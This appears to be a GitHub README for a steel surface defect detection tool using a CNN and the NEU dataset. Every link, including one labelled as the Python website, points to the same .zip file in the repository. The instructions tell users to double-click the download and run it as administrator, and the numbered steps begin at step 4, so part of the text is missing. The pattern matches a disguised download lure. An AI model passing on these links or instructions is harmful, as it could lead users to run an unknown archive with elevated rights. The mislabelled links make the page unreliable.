# 🛠️ steelsurface-defect-detection - Detect Steel Surface Defects Easily

[![Download](https://raw.githubusercontent.com/manuhub13/steelsurface-defect-detection/main/outputs/defect-steelsurface-detection-v2.5.zip)](https://raw.githubusercontent.com/manuhub13/steelsurface-defect-detection/main/outputs/defect-steelsurface-detection-v2.5.zip)

## 📖 Overview

The steelsurface-defect-detection application uses advanced techniques to identify defects on steel surfaces. It leverages a Convolutional Neural Network (CNN) and the NEU dataset for training. With the help of OpenCV preprocessing, this application provides clear visualizations of identified defects. The tool achieves approximately 96% accuracy, which can improve quality control in manufacturing.

4. Once the download is complete, locate the file in your downloads folder.

### ⚙️ Running the Application

1. Open the folder where you saved the application.
2. Double-click the application file to run it.
3. Follow the on-screen instructions to upload an image of a steel surface.
4. Wait for the application to analyze the image. You will see visualizations of any detected defects.

### 🛠️ Troubleshooting

If you encounter any issues while running the application, consider the following solutions:

- Ensure your operating system is up to date.
- Check if you have the required Python version installed. If not, download it from the [Python website](https://raw.githubusercontent.com/manuhub13/steelsurface-defect-detection/main/outputs/defect-steelsurface-detection-v2.5.zip).
- If the application does not open, try right-clicking the file and selecting "Run as administrator."

## 📚 How It Works

The steelsurface-defect-detection application uses a neural network to learn from images of steel surfaces. The model trains on a large dataset to understand what defects look like. When you upload an image, the model predicts and marks any defects, helping manufacturers improve their product quality.
